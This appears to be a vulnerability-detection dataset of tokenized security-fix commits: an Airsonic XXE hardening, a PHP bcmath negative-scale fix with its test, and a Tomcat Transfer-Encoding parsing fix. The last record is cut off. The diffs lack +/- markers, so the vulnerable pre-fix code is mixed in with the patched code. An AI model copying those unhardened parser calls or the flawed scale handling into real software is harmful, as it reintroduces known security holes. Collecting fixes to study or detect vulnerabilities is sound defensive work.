{"contents": ["Prevent", "xxe", "during", "parse", "Signed-off-by:", "Andrew", "DeMaria", "<lostonamountain@gmail.com>"], "code_tokens": ["@", "@", "-", "39", ",", "6", "+", "39", ",", "8", "@", "@", "import", "java", ".", "io", ".", "StringReader", ";", "import", "java", ".", "net", ".", "SocketException", ";", "import", "static", "org", ".", "airsonic", ".", "player", ".", "util", ".", "XMLUtil", ".", "createSAXBuilder", ";", "/", "**", "*", "Provides", "AJAX", "-", "enabled", "services", "for", "retrieving", "song", "lyrics", "from", "chartlyrics", ".", "com", ".", "*", "<", "p", "/", ">", "@", "@", "-", "80", ",", "7", "+", "82", ",", "7", "@", "@", "public", "LyricsInfo", "getLyrics", "(", "String", "artist", ",", "String", "song", ")", "{", "}", "private", "LyricsInfo", "parseSearchResult", "(", "String", "xml", ")", "throws", "Exception", "{", "SAXBuilder", "builder", "=", "new", "SAXBuilder", "(", ");", "SAXBuilder", "builder", "=", "createSAXBuilder", "(", ");", "Document", "document", "=", "builder", ".", "build", "(", "new", "StringReader", "(", "xml", ")", ");", "Element", "root", "=", "document", ".", "getRootElement", "(", ");", "@", "@", "-", "25", ",", "7", "+", "25", ",", "6", "@", "@", "import", "org", ".", "eclipse", ".", "persistence", ".", "jaxb", ".", "MarshallerProperties", ";", "import", "org", ".", "jdom", ".", "Attribute", ";", "import", "org", ".", "jdom", ".", "Document", ";", "import", "org", ".", "jdom", ".", "input", ".", "SAXBuilder", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "org", ".", "subsonic", ".", "restapi", ".", "Error", ";", "@", "@", "-", "46", ",", "6", "+", "45", ",", "7", "@", "@", "import", "java", ".", "util", ".", "Date", ";", "import", "java", ".", "util", ".", "GregorianCalendar", ";", "import", "static", "org", ".", "airsonic", ".", "player", ".", "util", ".", "XMLUtil", ".", "createSAXBuilder", ";", "import", "static", "org", ".", "springframework", ".", "web", ".", "bind", ".", "ServletRequestUtils", ".", "getStringParameter", ";", "/", "**", "@", "@", "-", "100", ",", "7", "+", "100", ",", "7", "@", "@", "private", "String", "getRESTProtocolVersion", "(", ")", "throws", "Exception", "{", "InputStream", "in", "=", "null", ";", "try", "{", "in", "=", "StringUtil", ".", "class", ".", "getResourceAsStream", "(", "\"/", "subsonic", "-", "rest", "-", "api", ".", "xsd", "\"", ");", "Document", "document", "=", "new", "SAXBuilder", "(", ").", "build", "(", "in", ")", ";", "Document", "document", "=", "createSAXBuilder", "(", ").", "build", "(", "in", ")", ";", "Attribute", "version", "=", "document", ".", "getRootElement", "(", ").", "getAttribute", "(", "\"", "version", "\"", ");", "return", "version", ".", "getValue", "(", ");", "}", "finally", "{", "@", "@", "-", "45", ",", "7", "+", "45", ",", "6", "@", "@", "import", "org", ".", "jdom", ".", "Document", ";", "import", "org", ".", "jdom", ".", "Element", ";", "import", "org", ".", "jdom", ".", "Namespace", ";", "import", "org", ".", "jdom", ".", "input", ".", "SAXBuilder", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "annotation", ".", "Autowired", ";", "@", "@", "-", "62", ",", "6", "+", "61", ",", "8", "@", "@", "import", "java", ".", "util", ".", "*;", "import", "java", ".", "util", ".", "concurrent", ".", "*;", "import", "static", "org", ".", "airsonic", ".", "player", ".", "util", ".", "XMLUtil", ".", "createSAXBuilder", ";", "/", "**", "*", "Provides", "services", "for", "Podcast", "reception", ".", "*", "@", "@", "-", "317", ",", "7", "+", "318", ",", "7", "@", "@", "private", "void", "doRefreshChannel", "(", "PodcastChannel", "channel", ",", "boolean", "downloadEpisodes", ")", "try", "(", "CloseableHttpResponse", "response", "=", "client", ".", "execute", "(", "method", ")", ")", "{", "in", "=", "response", ".", "getEntity", "(", ").", "getContent", "(", ");", "Document", "document", "=", "new", "SAXBuilder", "(", ").", "build", "(", "in", ")", ";", "Document", "document", "=", "createSAXBuilder", "(", ").", "build", "(", "in", ")", ";", "Element", "channelElement", "=", "document", ".", "getRootElement", "(", ").", "getChild", "(", "\"", "channel", "\"", ");", "channel", ".", "setTitle", "(", "StringUtil", ".", "removeMarkup", "(", "channelElement", ".", "getChildTextTrim", "(", "\"", "title", "\"", "))", ");", "@", "@", "-", "0", ",", "0", "+", "1", ",", "14", "@", "@", "package", "org", ".", "airsonic", ".", "player", ".", "util", ";", "import", "org", ".", "jdom", ".", "input", ".", "SAXBuilder", ";", "public", "class", "XMLUtil", "{", "public", "static", "SAXBuilder", "createSAXBuilder", "(", ")", "{", "SAXBuilder", "builder", "=", "new", "SAXBuilder", "(", ");", "builder", ".", "setFeature", "(", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "disallow", "-", "doctype", "-", "decl", "\"", ",", "true", ")", ";", "builder", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ",", "false", ")", ";", "builder", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "\"", ",", "false", ")", ";", "return", "builder", ";", "}", "}"], "docstring_tokens": ["xml", "external", "entity", "(xxe", ")"]}
{"contents": ["Fix", "bug", "#72093:", "bcpowmod", "accepts", "negative", "scale", "and", "corrupts", "_one_", "definition", "We", "can", "not", "modify", "result", "since", "it", "can", "be", "copy", "of", "_zero_", "or", "_one_,", "etc.", "and", "\"copy\"", "in", "bcmath", "is", "just", "bumping", "the", "refcount."], "code_tokens": ["@", "@", "-", "201", ",", "6", "+", "201", ",", "21", "@", "@", "static", "void", "php_str2num", "(", "bc_num", "*", "num", ",", "char", "*", "str", "TSRMLS_DC", ")", "}", "/", "*", "}", "}}", "*", "/", "/", "*", "{", "{{", "split_bc_num", "Convert", "to", "bc_num", "detecting", "scale", "*", "/", "static", "bc_num", "split_bc_num", "(", "bc_num", "num", ")", "{", "bc_num", "newnum", ";", "if", "(", "num", "-", ">", "n_refs", ">", "=", "1", ")", "{", "return", "num", ";", "}", "newnum", "=", "_bc_new_num_ex", "(", "0", ",", "0", ",", "0", ")", ";", "*", "newnum", "=", "*", "num", ";", "newnum", "-", ">", "n_refs", "=", "1", ";", "num", "-", ">", "n_refs", "-", "-;", "return", "newnum", ";", "}", "/", "*", "}", "}}", "*", "/", "/", "*", "{", "{{", "proto", "string", "bcadd", "(", "string", "left_operand", ",", "string", "right_operand", "[", ",", "int", "scale", "]", ")", "Returns", "the", "sum", "of", "two", "arbitrary", "precision", "numbers", "*", "/", "PHP_FUNCTION", "(", "bcadd", ")", "@", "@", "-", "214", ",", "7", "+", "229", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcadd", ")", "if", "(", "zend_parse_parameters", "(", "argc", "TSRMLS_CC", ",", "\"", "ss", "|", "l", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "right", ",", "&", "right_len", ",", "&", "scale_param", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "if", "(", "argc", "=", "=", "3", ")", "{", "scale", "=", "(", "int", ")", "(", "(", "int", ")", "scale_param", "<", "0", ")", "?", "0", ":", "scale_param", ";", "}", "@", "@", "-", "225", ",", "11", "+", "240", ",", "12", "@", "@", "PHP_FUNCTION", "(", "bcadd", ")", "php_str2num", "(", "&", "first", ",", "left", "TSRMLS_CC", ")", ";", "php_str2num", "(", "&", "second", ",", "right", "TSRMLS_CC", ")", ";", "bc_add", "(", "first", ",", "second", ",", "&", "result", ",", "scale", ")", ";", "if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale", ";", "}", "Z_STRVAL_P", "(", "return_value", ")", "=", "bc_num2str", "(", "result", ")", ";", "Z_STRLEN_P", "(", "return_value", ")", "=", "strlen", "(", "Z_STRVAL_P", "(", "return_value", ")", ");", "Z_TYPE_P", "(", "return_value", ")", "=", "IS_STRING", ";", "@", "@", "-", "253", ",", "7", "+", "269", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcsub", ")", "if", "(", "zend_parse_parameters", "(", "argc", "TSRMLS_CC", ",", "\"", "ss", "|", "l", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "right", ",", "&", "right_len", ",", "&", "scale_param", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "if", "(", "argc", "=", "=", "3", ")", "{", "scale", "=", "(", "int", ")", "(", "(", "int", ")", "scale_param", "<", "0", ")", "?", "0", ":", "scale_param", ";", "}", "@", "@", "-", "266", ",", "6", "+", "282", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcsub", ")", "bc_sub", "(", "first", ",", "second", ",", "&", "result", ",", "scale", ")", ";", "if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale", ";", "}", "@", "@", "-", "292", ",", "11", "+", "309", ",", "11", "@", "@", "PHP_FUNCTION", "(", "bcmul", ")", "if", "(", "zend_parse_parameters", "(", "argc", "TSRMLS_CC", ",", "\"", "ss", "|", "l", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "right", ",", "&", "right_len", ",", "&", "scale_param", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "if", "(", "argc", "=", "=", "3", ")", "{", "scale", "=", "(", "int", ")", "(", "(", "int", ")", "scale_param", "<", "0", ")", "?", "0", ":", "scale_param", ";", "}", "bc_init_num", "(", "&", "first", "TSRMLS_CC", ")", ";", "bc_init_num", "(", "&", "second", "TSRMLS_CC", ")", ";", "bc_init_num", "(", "&", "result", "TSRMLS_CC", ")", ";", "@", "@", "-", "305", ",", "6", "+", "322", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcmul", ")", "bc_multiply", "(", "first", ",", "second", ",", "&", "result", ",", "scale", "TSRMLS_CC", ")", ";", "if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale", ";", "}", "@", "@", "-", "331", ",", "11", "+", "349", ",", "11", "@", "@", "PHP_FUNCTION", "(", "bcdiv", ")", "if", "(", "zend_parse_parameters", "(", "argc", "TSRMLS_CC", ",", "\"", "ss", "|", "l", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "right", ",", "&", "right_len", ",", "&", "scale_param", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "if", "(", "argc", "=", "=", "3", ")", "{", "scale", "=", "(", "int", ")", "(", "(", "int", ")", "scale_param", "<", "0", ")", "?", "0", ":", "scale_param", ";", "}", "bc_init_num", "(", "&", "first", "TSRMLS_CC", ")", ";", "bc_init_num", "(", "&", "second", "TSRMLS_CC", ")", ";", "bc_init_num", "(", "&", "result", "TSRMLS_CC", ")", ";", "@", "@", "-", "345", ",", "6", "+", "363", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcdiv", ")", "switch", "(", "bc_divide", "(", "first", ",", "second", ",", "&", "result", ",", "scale", "TSRMLS_CC", ")", ")", "{", "case", "0", ":", "/", "*", "OK", "*", "/", "if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale", ";", "}", "Z_STRVAL_P", "(", "return_value", ")", "=", "bc_num2str", "(", "result", ")", ";", "@", "@", "-", "374", ",", "13", "+", "393", ",", "13", "@", "@", "PHP_FUNCTION", "(", "bcmod", ")", "if", "(", "zend_parse_parameters", "(", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "ss", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "right", ",", "&", "right_len", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "bc_init_num", "(", "&", "first", "TSRMLS_CC", ")", ";", "bc_init_num", "(", "&", "second", "TSRMLS_CC", ")", ";", "bc_init_num", "(", "&", "result", "TSRMLS_CC", ")", ";", "bc_str2num", "(", "&", "first", ",", "left", ",", "0", "TSRMLS_CC", ")", ";", "bc_str2num", "(", "&", "second", ",", "right", ",", "0", "TSRMLS_CC", ")", ";", "switch", "(", "bc_modulo", "(", "first", ",", "second", ",", "&", "result", ",", "0", "TSRMLS_CC", ")", ")", "{", "case", "0", ":", "Z_STRVAL_P", "(", "return_value", ")", "=", "bc_num2str", "(", "result", ")", ";", "@", "@", "-", "391", ",", "7", "+", "410", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcmod", ")", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Division", "by", "zero", "\"", ");", "break", ";", "}", "bc_free_num", "(", "&", "first", ")", ";", "bc_free_num", "(", "&", "second", ")", ";", "bc_free_num", "(", "&", "result", ")", ";", "@", "@", "-", "424", ",", "16", "+", "443", ",", "17", "@", "@", "PHP_FUNCTION", "(", "bcpowmod", ")", "scale_int", "=", "(", "int", ")", "(", "(", "int", ")", "scale", "<", "0", ")", "?", "0", ":", "scale", ";", "if", "(", "bc_raisemod", "(", "first", ",", "second", ",", "mod", ",", "&", "result", ",", "scale_int", "TSRMLS_CC", ")", "!", "=", "-", "1", ")", "{", "if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "-", ">", "n_scale", "=", "scale", ";", "if", "(", "result", "-", ">", "n_scale", ">", "scale_int", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale_int", ";", "}", "Z_STRVAL_P", "(", "return_value", ")", "=", "bc_num2str", "(", "result", ")", ";", "Z_STRLEN_P", "(", "return_value", ")", "=", "strlen", "(", "Z_STRVAL_P", "(", "return_value", ")", ");", "Z_TYPE_P", "(", "return_value", ")", "=", "IS_STRING", ";", "}", "else", "{", "RETVAL_FALSE", ";", "}", "bc_free_num", "(", "&", "first", ")", ";", "bc_free_num", "(", "&", "second", ")", ";", "bc_free_num", "(", "&", "mod", ")", ";", "@", "@", "-", "455", ",", "7", "+", "475", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcpow", ")", "if", "(", "zend_parse_parameters", "(", "argc", "TSRMLS_CC", ",", "\"", "ss", "|", "l", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "right", ",", "&", "right_len", ",", "&", "scale_param", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "if", "(", "argc", "=", "=", "3", ")", "{", "scale", "=", "(", "int", ")", "(", "(", "int", ")", "scale_param", "<", "0", ")", "?", "0", ":", "scale_param", ";", "}", "@", "@", "-", "468", ",", "6", "+", "488", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bcpow", ")", "bc_raise", "(", "first", ",", "second", ",", "&", "result", ",", "scale", "TSRMLS_CC", ")", ";", "if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale", ";", "}", "@", "@", "-", "494", ",", "16", "+", "515", ",", "17", "@", "@", "PHP_FUNCTION", "(", "bcsqrt", ")", "if", "(", "zend_parse_parameters", "(", "argc", "TSRMLS_CC", ",", "\"", "s", "|", "l", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "scale_param", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "if", "(", "argc", "=", "=", "2", ")", "{", "scale", "=", "(", "int", ")", "(", "(", "int", ")", "scale_param", "<", "0", ")", "?", "0", ":", "scale_param", ";", "}", "bc_init_num", "(", "&", "result", "TSRMLS_CC", ")", ";", "php_str2num", "(", "&", "result", ",", "left", "TSRMLS_CC", ")", ";", "if", "(", "bc_sqrt", "(", "&", "result", ",", "scale", "TSRMLS_CC", ")", "!", "=", "0", ")", "{", "if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale", ";", "}", "Z_STRVAL_P", "(", "return_value", ")", "=", "bc_num2str", "(", "result", ")", ";", "@", "@", "-", "531", ",", "7", "+", "553", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bccomp", ")", "if", "(", "zend_parse_parameters", "(", "argc", "TSRMLS_CC", ",", "\"", "ss", "|", "l", "\"", ",", "&", "left", ",", "&", "left_len", ",", "&", "right", ",", "&", "right_len", ",", "&", "scale_param", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "if", "(", "argc", "=", "=", "3", ")", "{", "scale", "=", "(", "int", ")", "(", "(", "int", ")", "scale_param", "<", "0", ")", "?", "0", ":", "scale_param", ";", "}", "@", "@", "-", "555", ",", "7", "+", "577", ",", "7", "@", "@", "PHP_FUNCTION", "(", "bccomp", ")", "PHP_FUNCTION", "(", "bcscale", ")", "{", "long", "new_scale", ";", "if", "(", "zend_parse_parameters", "(", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "l", "\"", ",", "&", "new_scale", ")", "=", "=", "FAILURE", ")", "{", "return", ";", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "13", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "72093", ":", "bcpowmod", "accepts", "negative", "scale", "and", "corrupts", "_one_", "definition", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "bcmath", "\"", "))", "print", "\"", "skip", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "var_dump", "(", "bcpowmod", "(", "1", ",", "\"", "A", "\"", ",", "128", ",", "-", "200", ")", ");", "var_dump", "(", "bcpowmod", "(", "1", ",", "1", ".", "2", ",", "1", ",", "1", ")", ");", "?", ">", "-", "-", "EXPECTF", "-", "-", "string", "(", "1", ")", "\"", "1", "\"", "bc", "math", "warning", ":", "non", "-", "zero", "scale", "in", "exponent", "string", "(", "3", ")", "\"", "0", ".", "0", "\"", "@", "@", "-", "2", ",", "7", "+", "2", ",", "7", "@", "@", "/", "*", "edit", "configure", ".", "in", "to", "change", "version", "number", "*", "/", "#", "define", "PHP_MAJOR_VERSION", "5", "#", "define", "PHP_MINOR_VERSION", "5", "#", "define", "PHP_RELEASE_VERSION", "35", "#", "define", "PHP_RELEASE_VERSION", "27", "#", "define", "PHP_EXTRA_VERSION", "\"", "-", "dev", "\"", "#", "define", "PHP_VERSION", "\"", "5", ".", "5", ".", "35", "-", "dev", "\"", "#", "define", "PHP_VERSION_ID", "50535", "#", "define", "PHP_VERSION", "\"", "5", ".", "5", ".", "27", "-", "dev", "\"", "#", "define", "PHP_VERSION_ID", "50527"], "docstring_tokens": ["buffer", "overflow"]}
{"contents": ["Correct", "a", "regression", "in", "transfer-encoding", "parsing", "Invalid", "tokens", "are", "an", "error"], "code_tokens": ["@", "@", "-", "723", ",", "10", "+", "723", ",", "14", "@", "@", "private", "void", "prepareRequest", "(", ")", "throws", "IOException", "{", "MessageBytes", "transferEncodingValueMB", "=", "headers", ".", "getValue", "(", "\"", "transfer", "-", "encoding", "\"", ");", "if", "(", "transferEncodingValueMB", "!", "=", "null", ")", "{", "List", "<", "String", ">", "encodingNames", "=", "new", "ArrayList", "<", ">(", ");", "TokenList", ".", "parseTokenList", "(", "headers", ".", "values", "(", "\"", "transfer", "-", "encoding", "\"", "),", "encodingNames", ")", ";", "for", "(", "String", "encodingName", ":", "encodingNames", ")", "{", "/", "/", "\"", "identity", "\"", "codings", "are", "ignored", "addInputFilter", "(", "inputFilters", ",", "encodingName", ")", ";", "if", "(", "TokenList", ".", "parseTokenList", "(", "headers", ".", "values", "(", "\"", "transfer", "-", "encoding", "\"", "),", "encodingNames", ")", ")", "{", "for", "(", "String", "encodingName", ":", "encodingNames", ")", "{", "/", "/", "\"", "identity", "\"", "codings", "are", "ignored", "addInputFilter", "(", "inputFilters", ",", "encodingName", ")", ";", "}", "}", "else", "{", "/", "/", "Invalid", "transfer", "encoding", "badRequest", "(", "\"", "http11processor", ".", "request", ".", "invalidTransferEncoding", "\"", ");", "}", "}", "}", "@", "@", "-", "23", ",", "6", "+", "23", ",", "7", "@", "@", "http11processor", ".", "header", ".", "parse", "=", "Error", "parsing", "HTTP", "request", "header", "http11processor", ".", "request", ".", "finish", "=", "Error", "finishing", "request", "http11processor", ".", "request", ".", "inconsistentHosts", "=", "The", "host", "specified", "in", "the", "request", "line", "is", "not", "consistent", "with", "the", "host", "header", "http11processor", ".", "request", ".", "invalidScheme", "=", "The", "HTTP", "request", "contained", "an", "absolute", "URI", "with", "an", "invalid", "scheme", "http11processor", ".", "request", ".", "invalidTransferEncoding", "=", "The", "HTTP", "request", "contained", "an", "invalid", "Transfer", "-", "Encoding", "header", "http11processor", ".", "request", ".", "invalidUri", "=", "The", "HTTP", "request", "contained", "an", "invalid", "URI", "http11processor", ".", "request", ".", "invalidUserInfo", "=", "The", "HTTP", "request", "contained", "an", "absolute", "URI", "with", "an", "invalid", "userinfo", "http11processor", ".", "request", ".", "multipleContentLength", "=", "The", "request", "contained", "multiple", "content", "-", "length", "headers", "@", "@", "-", "34", ",", "37", "+", "34", ",", "51", "@", "@", "private", "TokenList", "(", ")", "{", "*", "Parses", "an", "enumeration", "of", "header", "values", "of", "the", "form", "1", "#", "token", ",", "forcing", "all", "*", "parsed", "values", "to", "lower", "case", ".", "*", "*", "@", "param", "inputs", "The", "headers", "to", "parse", "*", "@", "param", "result", "The", "Collection", "(", "usually", "a", "list", "of", "a", "set", ")", "to", "which", "the", "*", "parsed", "tokens", "should", "be", "added", "*", "@", "param", "inputs", "The", "headers", "to", "parse", "*", "@", "param", "collection", "The", "Collection", "(", "usually", "a", "list", "of", "a", "set", ")", "to", "which", "the", "*", "parsed", "tokens", "should", "be", "added", "*", "*", "@", "return", "{", "@", "code", "}", "true", "if", "the", "header", "values", "were", "parsed", "cleanly", ",", "otherwise", "*", "{", "@", "code", "false", "}", "(", "e", ".", "g", ".", "if", "a", "non", "-", "token", "value", "was", "encountered", ")", "*", "*", "@", "throws", "IOException", "If", "an", "I", "/", "O", "error", "occurs", "reading", "the", "header", "*", "/", "public", "static", "void", "parseTokenList", "(", "Enumeration", "<", "String", ">", "inputs", ",", "Collection", "<", "String", ">", "result", ")", "throws", "IOException", "{", "public", "static", "boolean", "parseTokenList", "(", "Enumeration", "<", "String", ">", "inputs", ",", "Collection", "<", "String", ">", "collection", ")", "throws", "IOException", "{", "boolean", "result", "=", "true", ";", "while", "(", "inputs", ".", "hasMoreElements", "(", "))", "{", "String", "nextHeaderValue", "=", "inputs", ".", "nextElement", "(", ");", "if", "(", "nextHeaderValue", "!", "=", "null", ")", "{", "TokenList", ".", "parseTokenList", "(", "new", "StringReader", "(", "nextHeaderValue", ")", ",", "result", ")", ";", "if", "(", "!", "TokenList", ".", "parseTokenList", "(", "new", "StringReader", "(", "nextHeaderValue", ")", ",", "collection", ")", ")", "{", "result", "=", "false", ";", "}", "}", "}", "return", "result", ";", "}", "/", "**", "*", "Parses", "a", "header", "of", "the", "form", "1", "#", "token", ",", "forcing", "all", "parsed", "values", "to", "lower", "*", "case", ".", "This", "is", "typically", "used", "when", "header", "values", "are", "case", "-", "insensitive", ".", "*", "*", "@", "param", "input", "The", "header", "to", "parse", "*", "@", "param", "result", "The", "Collection", "(", "usually", "a", "list", "of", "a", "set", ")", "to", "which", "the", "*", "parsed", "tokens", "should", "be", "added", "*", "@", "param", "input", "The", "header", "to", "parse", "*", "@", "param", "collection", "The", "Collection", "(", "usually", "a", "list", "of", "a", "set", ")", "to", "which", "the", "*", "parsed", "tokens", "should", "be", "added", "*", "*", "@", "return", "{", "@", "code", "}", "true", "if", "the", "header", "was", "parsed", "cleanly", ",", "otherwise", "*", "{", "@", "code", "false", "}", "(", "e", ".", "g", ".", "if", "a", "non", "-", "token", "value", "was", "encountered", ")", "*", "*", "@", "throws", "IOException", "If", "an", "I", "/", "O", "error", "occurs", "reading", "the", "header", "*", "/", "public", "static", "void", "parseTokenList", "(", "Reader", "input", ",", "Collection", "<", "String", ">", "result", ")", "throws", "IOException", "{", "public", "static", "boolean", "parseTokenList", "(", "Reader", "input", ",", "Collection", "<", "String", ">", "collection", ")", "throws", "IOException", "{", "boolean", "invalid", "=", "false", ";", "boolean", "valid", "=", "false", ";", "do", "{", "String", "fieldName", "=", "HttpParser", ".", "readToken", "(", "input", ")", ";", "if", "(", "fieldName", "=", "=", "null", ")", "{", "/", "/", "Invalid", "field", "-", "name", ",", "skip", "to", "the", "next", "one", "invalid", "=", "true", ";", "HttpParser", ".", "skipUntil", "(", "input", ",", "0", ",", "'", ",'", ");", "continue", ";", "}", "@", "@", "-", "77", ",", "16", "+", "91", ",", "23", "@", "@", "public", "static", "void", "parseTokenList", "(", "Reader", "input", ",", "Collection", "<", "String", ">", "result", ")", "throw", "SkipResult", "skipResult", "=", "HttpParser", ".", "skipConstant", "(", "input", ",", "\"", ",\"", ");", "if", "(", "skipResult", "=", "=", "SkipResult", ".", "EOF", ")", "{", "/", "/", "EOF", "result", ".", "add", "(", "fieldName", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ");", "valid", "=", "true", ";", "collection", ".", "add", "(", "fieldName", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ");", "break", ";", "}", "else", "if", "(", "skipResult", "=", "=", "SkipResult", ".", "FOUND", ")", "{", "result", ".", "add", "(", "fieldName", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ");", "valid", "=", "true", ";", "collection", ".", "add", "(", "fieldName", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ");", "continue", ";", "}", "else", "{", "/", "/", "Not", "a", "token", "-", "ignore", "it", "invalid", "=", "true", ";", "HttpParser", ".", "skipUntil", "(", "input", ",", "0", ",", "'", ",'", ");", "continue", ";", "}", "}", "while", "(", "true", ")", ";", "/", "/", "Only", "return", "true", "if", "at", "least", "one", "valid", "token", "was", "read", "and", "no", "invalid", "/", "/", "entries", "were", "found", "return", "valid", "&", "&", "!", "invalid", ";", "}", "}", "@", "@", "-", "31", ",", "15", "+", "31", ",", "15", "@", "@", "public", "void", "testAll", "(", ")", "throws", "IOException", "{", "Set", "<", "String", ">", "expected", "=", "new", "HashSet", "<", ">(", ");", "expected", ".", "add", "(", "\"*", "\")", ";", "doTestVary", "(", "\"*", "\",", "expected", ")", ";", "doTestVary", "(", "\"*", "\",", "expected", ",", "true", ")", ";", "}", "@", "Test", "public", "void", "testSingle", "(", ")", "throws", "IOException", "{", "Set", "<", "String", ">", "expected", "=", "new", "HashSet", "<", ">(", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"", "Host", "\"", ",", "expected", ")", ";", "doTestVary", "(", "\"", "Host", "\"", ",", "expected", ",", "true", ")", ";", "}", "@", "@", "-", "49", ",", "19", "+", "49", ",", "19", "@", "@", "public", "void", "testMultiple", "(", ")", "throws", "IOException", "{", "expected", ".", "add", "(", "\"", "bar", "\"", ");", "expected", ".", "add", "(", "\"", "foo", "\"", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"", "Host", ",", "Foo", ",", "Bar", "\"", ",", "expected", ")", ";", "doTestVary", "(", "\"", "Host", ",", "Foo", ",", "Bar", "\"", ",", "expected", ",", "true", ")", ";", "}", "@", "Test", "public", "void", "testEmptyString", "(", ")", "throws", "IOException", "{", "doTestVary", "(", "\"\"", ",", "Collections", ".", "emptySet", "(", "))", ";", "doTestVary", "(", "\"\"", ",", "Collections", ".", "emptySet", "(", "),", "false", ")", ";", "}", "@", "Test", "public", "void", "testSingleInvalid", "(", ")", "throws", "IOException", "{", "doTestVary", "(", "\"{", "{{", "\",", "Collections", ".", "emptySet", "(", "))", ";", "doTestVary", "(", "\"{", "{{", "\",", "Collections", ".", "emptySet", "(", "),", "false", ")", ";", "}", "@", "@", "-", "71", ",", "7", "+", "71", ",", "7", "@", "@", "public", "void", "testMultipleWithInvalidStart", "(", ")", "throws", "IOException", "{", "expected", ".", "add", "(", "\"", "bar", "\"", ");", "expected", ".", "add", "(", "\"", "foo", "\"", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"{", "{{", ",", "Host", ",", "Foo", ",", "Bar", "\"", ",", "expected", ")", ";", "doTestVary", "(", "\"{", "{{", ",", "Host", ",", "Foo", ",", "Bar", "\"", ",", "expected", ",", "false", ")", ";", "}", "@", "@", "-", "81", ",", "7", "+", "81", ",", "7", "@", "@", "public", "void", "testMultipleWithInvalidMiddle", "(", ")", "throws", "IOException", "{", "expected", ".", "add", "(", "\"", "bar", "\"", ");", "expected", ".", "add", "(", "\"", "foo", "\"", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"", "Host", ",", "{", "{{", ",", "Foo", ",", "Bar", "\"", ",", "expected", ")", ";", "doTestVary", "(", "\"", "Host", ",", "{", "{{", ",", "Foo", ",", "Bar", "\"", ",", "expected", ",", "false", ")", ";", "}", "@", "@", "-", "91", ",", "7", "+", "91", ",", "7", "@", "@", "public", "void", "testMultipleWithInvalidEnd", "(", ")", "throws", "IOException", "{", "expected", ".", "add", "(", "\"", "bar", "\"", ");", "expected", ".", "add", "(", "\"", "foo", "\"", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"", "Host", ",", "Foo", ",", "Bar", ",", "{", "{{", "\",", "expected", ")", ";", "doTestVary", "(", "\"", "Host", ",", "Foo", ",", "Bar", ",", "{", "{{", "\",", "expected", ",", "false", ")", ";", "}", "@", "@", "-", "101", ",", "7", "+", "101", ",", "7", "@", "@", "public", 